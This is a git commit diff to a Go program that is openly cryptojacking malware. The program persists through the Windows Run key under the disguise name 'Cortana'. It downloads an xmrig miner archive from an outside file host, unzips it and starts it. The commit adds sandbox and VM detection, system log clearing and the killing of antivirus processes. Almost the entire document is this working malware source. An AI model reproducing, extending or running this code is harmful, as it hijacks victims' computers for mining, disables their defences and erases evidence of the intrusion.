78414bfc95a30c7d90fedae6ef9c73f7e2c2c327
Mikołaj Lubiak <lubiak@proton.me>
2023-04-25 15:34:51 +0200

    Unified logging, added coldfire stuff

--- main.go
+++ main.go
@@ -1,10 +1,7 @@
-// Main package
 package main
 
-// Import needed libraties
 import (
 	"archive/zip"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
@@ -21,99 +18,73 @@ import (
 )
 
 // Func that downloads files
-func downloadFile(filepath string, url string) (err error) {
+func downloadFile(filepath string, url string) {
 	// Create the file
 	out, err := os.Create(filepath)
-	if err != nil {
-		return err
-	}
+	log.Println(err)
 	defer out.Close()
 
 	// Get the data
 	resp, err := http.Get(url)
-	if err != nil {
-		return err
-	}
+	log.Println(err)
 	defer resp.Body.Close()
 
 	// Check server response
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("bad status: %s", resp.Status)
+		log.Println(resp.Status)
 	}
 
 	// Writer the body to file
 	_, err = io.Copy(out, resp.Body)
-	if err != nil {
-		return err
-	}
-
-	return nil
+	log.Println(err)
 }
 
 // Func that unzips the source file and archives within that file
-func unzipSource(source, destination string) error {
+func unzipSource(source, destination string) {
 	// 1. Open the zip file
 	reader, err := zip.OpenReader(source)
-	if err != nil {
-		return err
-	}
+	log.Println(err)
 	defer reader.Close()
 
 	// 2. Get the absolute destination path
 	destination, err = filepath.Abs(destination)
-	if err != nil {
-		return err
-	}
+	log.Println(err)
 
 	// 3. Iterate over zip files inside the archive and unzip each of them
 	for _, f := range reader.File {
-		err := unzipFile(f, destination)
-		if err != nil {
-			return err
-		}
+		unzipFile(f, destination)
 	}
-
-	return nil
 }
 
 // Func that unzips files
-func unzipFile(f *zip.File, destination string) error {
+func unzipFile(f *zip.File, destination string) {
 	// 4. Check if file paths are not vulnerable to Zip Slip
 	filePath := filepath.Join(destination, f.Name)
 	if !strings.HasPrefix(filePath, filepath.Clean(destination)+string(os.PathSeparator)) {
-		return fmt.Errorf("invalid file path: %s", filePath)
+		log.Printf("invalid file path: %s", filePath)
 	}
 
 	// 5. Create directory tree
 	if f.FileInfo().IsDir() {
-		if err := os.MkdirAll(filePath, os.ModePerm); err != nil {
-			return err
-		}
-		return nil
+		err := os.MkdirAll(filePath, os.ModePerm)
+		log.Println(err)
 	}
 
-	if err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
-		return err
-	}
+	err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm)
+	log.Println(err)
 
 	// 6. Create a destination file for unzipped content
 	destinationFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
-	if err != nil {
-		return err
-	}
+	log.Println(err)
 	defer destinationFile.Close()
 
 	// 7. Unzip the content of a file and copy it to the destination file
 	zippedFile, err := f.Open()
-	if err != nil {
-		return err
-	}
+	log.Println(err)
 	defer zippedFile.Close()
 
-	if _, err := io.Copy(destinationFile, zippedFile); err != nil {
-		return err
-	}
-	return nil
+	_, err = io.Copy(destinationFile, zippedFile)
+	log.Println(err)
 }
 
 // Func that starts the xmrig command/process
@@ -145,49 +116,51 @@ func startCommand(dir string) {
 // Func that puts this binary into autostart
 func autoStart() {
 	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
-	if err != nil {
-		log.Fatal(err)
-	}
+	log.Println(err)
 	defer key.Close()
 
 	loc, _ := os.Executable()
 	err = key.SetStringValue("Cortana", loc)
-	if err != nil {
-		log.Fatal(err)
-	}
+	log.Println(err)
 }
 
 // Main func that initializes everything
 func main() {
-	f, err := os.OpenFile("cortanalog.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
-	if err != nil {
-		log.Fatalf("error opening file: %v", err)
+	// Check if is running in a sandbox
+	if coldfire.SandboxAll() {
+		log.Println("DONT RUN ME IN A VIRTUAL MACHINE, IT MAKES ME SAD")
+		os.Exit(1)
 	}
+
+	// Clear system logs
+	defer coldfire.ClearLogs()
+
+	// Delete the old log file
+	os.Remove("cortanalog.txt")
+
+	// Log everything to file
+	f, err := os.OpenFile("cortanalog.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	defer f.Close()
 	log.SetOutput(f)
 
-	if coldfire.SandboxAll() {
-		log.Println("SOMEERROR ;)")
-		os.Exit(0)
-	}
+	// Kill AV processes
+	err = coldfire.PkillAv()
+	log.Println(err)
 
+	// Add to autostart
 	autoStart()
 
+	// Create temp directory
 	dir, err := ioutil.TempDir("", "cortanacache")
-	if err != nil {
-		log.Fatal(err)
-	}
+	log.Println(err)
 	defer os.RemoveAll(dir)
 
-	err = downloadFile(filepath.Join(dir, "cortanacache.zip"), "https://files.catbox.moe/g9ivbr.zip")
-	if err != nil {
-		log.Fatalf("error downloading file: %v", err)
-	}
+	// Download the miner
+	downloadFile(filepath.Join(dir, "cortanacache.zip"), "https://files.catbox.moe/g9ivbr.zip")
 
-	err = unzipSource(filepath.Join(dir, "cortanacache.zip"), filepath.Join(dir, "cortanacache"))
-	if err != nil {
-		log.Fatal(err)
-	}
+	// Unzip the miner
+	unzipSource(filepath.Join(dir, "cortanacache.zip"), filepath.Join(dir, "cortanacache"))
 
+	// Start the miner
 	startCommand(dir)
 }
